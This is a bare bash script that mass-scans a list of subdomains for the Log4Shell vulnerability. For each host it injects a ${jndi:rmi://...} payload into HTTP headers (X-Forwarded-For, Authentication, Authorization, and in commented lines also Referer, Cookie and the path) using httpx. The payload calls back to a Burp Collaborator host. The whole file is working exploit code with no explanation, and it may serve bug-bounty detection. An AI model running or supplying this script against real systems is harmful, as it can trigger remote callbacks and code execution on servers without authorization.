#!/bin/bash
while read -r subdomain; do
	collaborator=$(date +%N).g9q2b02kptboq222tnnjofnopfvbj0.burpcollaborator.net
	payload="\${jndi:rmi://$collaborator:443/a}"

	#echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -H "Referer: $payload" -path "/$payload" -H "Cookie: $payload=$payload" -http-proxy http://localhost:4321
	#echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -H "Referer: $payload" -H "Cookie: $payload=$payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -H "X-forwared-for: $payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -H "Authentication: $payload" -http-proxy http://localhost:4321
	echo $subdomain | httpx -title -follow-redirects -status-code -tech-detect -silent -H "Authorization: $payload" -http-proxy http://localhost:4321

done < $1